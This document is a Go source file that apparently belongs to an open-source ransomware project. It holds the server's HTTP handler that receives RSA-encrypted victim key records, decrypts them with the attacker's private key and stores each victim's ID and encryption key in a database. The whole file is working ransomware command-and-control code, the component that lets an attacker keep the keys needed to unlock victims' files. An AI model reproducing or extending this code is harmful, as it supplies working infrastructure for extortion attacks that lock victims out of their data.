package main

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/julienschmidt/httprouter"
	"github.com/mauri870/ransomware/repository"
	"github.com/mauri870/ransomware/rsa"
)

func validateAndPersistKeys(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
	w.Header().Set("Content-Type", "application/json")

	r.ParseForm()

	if r.FormValue("payload") == "" {
		w.WriteHeader(http.StatusUnprocessableEntity)
		fmt.Fprint(w, ApiResponseNoPayload)
		return
	}

	// Decode the hex string to []byte
	payload, err := hex.DecodeString(r.FormValue("payload"))
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	// Decrypt the payload
	jsonPayload, err := rsa.Decrypt(PRIV_KEY, payload)
	if err != nil {
		w.WriteHeader(http.StatusUnprocessableEntity)
		fmt.Fprint(w, ApiResponseBadRSAEncryption)
		return
	}

	// Parse the json keys
	keys, err := parseJsonKeys(jsonPayload)
	if err != nil {
		// Bad Json
		w.WriteHeader(http.StatusBadRequest)
		fmt.Fprint(w, ApiResponseBadJson)
		return
	}

	// If not goes wrong, persist the keys...
	db := repository.Open("./database.db")
	defer db.Close()

	if !db.IsAvailable(keys["id"]) {
		// Id already exists
		w.WriteHeader(http.StatusConflict)
		fmt.Fprint(w, ApiResponseDuplicatedId)
		return
	}

	db.CreateOrUpdate(keys["id"], keys["enckey"])

	w.WriteHeader(http.StatusNoContent)
}

// Parse the json keys
func parseJsonKeys(body []byte) (map[string]string, error) {
	var keys map[string]string
	if err := json.Unmarshal(body, &keys); err != nil {
		return keys, err
	}

	return keys, nil
}
